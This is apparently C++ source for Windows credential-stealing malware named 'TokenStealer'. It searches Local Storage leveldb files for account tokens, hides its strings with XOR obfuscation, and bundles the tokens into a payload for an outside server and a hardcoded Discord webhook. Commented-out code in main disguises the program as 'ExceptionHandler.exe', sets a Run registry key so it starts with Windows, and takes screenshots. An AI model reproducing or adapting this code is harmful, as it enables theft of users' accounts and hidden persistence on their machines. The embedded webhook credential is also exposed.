#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <Wininet.h>
#include <filesystem>
#include <regex>
#include "helper.h"
#include "xor.hpp"
#include "requests.h"
#include <gdiplus.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")

namespace fs = std::filesystem;
const bool TEST_SERVER = true;
const std::string STARTUP_FILE_NAME = xorstr_("ExceptionHandler.exe");
const std::string PROGRAM_NAME = xorstr_("TokenStealer.exe");

std::vector<std::string> get_tokens() {
	std::vector<std::string> tokens = {};
	for (auto path : paths) {
		if (!(stat(path.second.c_str(), &info) != 0) && info.st_mode & S_IFDIR) {
			if (!(info.st_mode & S_IFDIR)) {
				continue;
			}

			path.second += xorstr_("\\Local Storage\\leveldb");

			for (const auto& entry : fs::directory_iterator(path.second)) {
				if (fs::path(entry.path()).extension().string() != xorstr_(".log") && fs::path(entry.path()).extension().string() != xorstr_(".ldb")) {
					continue;
				}

				std::smatch match;
				std::string content = read_file(entry.path().string().c_str());

				std::string::const_iterator search_start(content.cbegin());
				while (std::regex_search(search_start, content.cend(), match, std::regex(regex_token))) {
					tokens.push_back(match[0]);
					search_start = match.suffix().first;
				}
			}
		}
	}
	return tokens;
}

std::string prepare_payload(std::vector<std::string> tokens) {
	std::string payload = xorstr_("cmd=send_message&content=**Tokens**\n```\n");
	for (auto token : tokens) {
		payload += token + xorstr_("\n");
	}

	payload += xorstr_("\n```");

	if (TEST_SERVER) {
		payload += xorstr_("&webhook_url=https://discord.com/api/webhooks/777926127125397504/4aoZd7pwwrVIIXEA29lC28f7EGoGQX9hzRSdovnVaXfCEmpMkKhCRVs17XVVosR1t9ke");
	}

	return payload;
}

bool check_for_startup() {
	for (const auto& entry : fs::directory_iterator(roaming+ xorstr_("\\Microsoft\\"))) {
		if (entry.path().filename().string() == STARTUP_FILE_NAME) {
			std::cout << entry.path() << std::endl;
			return true;
		}
	}
	return false;
}

int main() {

	///* Check if we've already created startup */
	//if (check_for_startup()) {

	//	/* Determine if ran from startup */
	//	auto uptime = std::chrono::milliseconds(GetTickCount64());
	//	if ((uptime / 60000).count() <= 1) {
	//		std::cout << "Started up " << (uptime / 60000).count() << " minuetes ago" << std::endl;
	//	}

	//	/* Just send screenshot */
	//	take_screenshot(roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));

	//} else {

	//	/* Make copy to roaming microsoft folder*/
	//	try {
	//		std::filesystem::copy(PROGRAM_NAME, roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
	//	} catch (std::filesystem::filesystem_error & e) {}

	//	/* Edit registry */
	//	HKEY key = NULL;
	//	LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
	//	LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).c_str(), ((roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));
	//
	//	/* Get Tokens */
	//	//auto tokens = get_tokens();

	//	////* Prepare Payload */
	//	//auto payload = prepare_payload(tokens);

	//	////* Post Tokens */
	//	//post_request(xorstr_("https://overflow.red/post.php"), payload);
	//}
	post_request(xorstr_("https://overflow.red/post.php"), "cmd=send_message&content=test");

	std::cin.get();
}